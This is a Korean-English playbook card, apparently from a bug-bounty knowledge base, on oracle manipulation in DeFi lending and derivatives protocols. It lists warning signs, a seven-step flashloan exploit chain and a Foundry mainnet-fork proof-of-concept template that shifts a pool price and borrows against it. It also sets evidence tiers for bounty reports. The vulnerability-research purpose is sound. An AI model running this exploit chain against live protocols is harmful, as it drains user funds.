# Scenario: Oracle Manipulation (TWAP + Spot)

> DeFi Critical 최빈도 패턴. lending/borrowing, 파생상품, stablecoin depeg에서 반복.

## 1. Threat Model
- **타겟**: Lending 프로토콜, 파생상품, perpetual DEX, CDP/stablecoin
- **공격자**: 플래시론으로 일시 자본 확보 가능한 unauthenticated 사용자
- **Impact**: 담보 해킹, 부채 과다 생성, 청산 회피
- **Severity**: Critical (funds at risk > $100K typical)

## 2. Discovery Signals
- `priceFeed`, `oracle`, `getPrice`, `latestAnswer` 함수 호출
- 단일 Uniswap v2 pair를 price source로 사용
- TWAP window 짧음 (< 30 min) 또는 spot price 직접 사용
- LP token / synthetic asset / rebase 토큰 담보 허용
- Chainlink + 백업 소스 혼합 시 fallback 트리거 조건

## 3. Exploit Chain
```
A. 타겟 프로토콜의 oracle 경로 식별 (lens contract, custom aggregator)
B. price source DEX의 liquidity depth 측정
C. Flashloan으로 depth 대비 충분한 자본 확보
D. DEX에서 대량 swap → price shift
E. 즉시 타겟 프로토콜에서 borrow/redeem/trade (shift된 price로 계산)
F. DEX swap 되돌리기 (또는 다른 pool로 빠져나오기)
G. Flashloan 상환 → profit
```

## 4. PoC Template
```solidity
// Foundry fork mainnet, 사건 직전 블록
function test_oracle_manip() public {
    vm.createSelectFork("mainnet", 20_100_000);
    deal(address(WETH), address(this), 10_000 ether);

    uint256 priceBefore = victim.getPrice(address(asset));
    // 1. pool에 대량 swap
    uniswap.swap(address(asset), address(WETH), 10_000 ether);
    uint256 priceAfter = victim.getPrice(address(asset));
    assertGt(priceAfter, priceBefore * 3, "oracle shifted");

    // 2. victim에 inflated price로 borrow
    victim.borrow(priceAfter * 1e18);
    // 3. 되돌리기 + flashloan 상환
}
```

## 5. Evidence Tier
- **E1**: mainnet fork test 성공 + profit > $10K + tx trace 전체 (state diff 포함)
- **E2**: fork test 조작 성공, 금액은 근사값
- **E3**: oracle 경로 정적 분석만
- **E4**: 의심 신호만

## 6. Gate 1 / Gate 2
- [ ] manipulation cost < expected profit 입증?
- [ ] TWAP window 실제 값 (IronBank 사고처럼 30min짜리도 가능)
- [ ] Oracle "Staleness" = OOS 프로그램 (Immunefi 공통) — 구분 필수
- [ ] Governance delay로 price source 변경 가능성 (timing risk)

## 7. Variants
- Read-only reentrancy로 view 함수 조작 (Curve 2022 계보)
- LP token pricing: `total_supply * priceOfLP` 경로
- sUSDe / stETH 등 rebase 토큰의 balance view 타이밍
- Multi-hop: 한 oracle 조작 → 다른 파생 oracle 연쇄

## 8. References
- Mango Markets 2022 — 사회공학적 CFR/지연 aggregator
- Inverse Finance 2022 — LP token oracle
- UwU Lend 2024 — sUSDe 가격 피드
- `knowledge/techniques/defi_hacks_2025_2026.md` 섹션 2.1
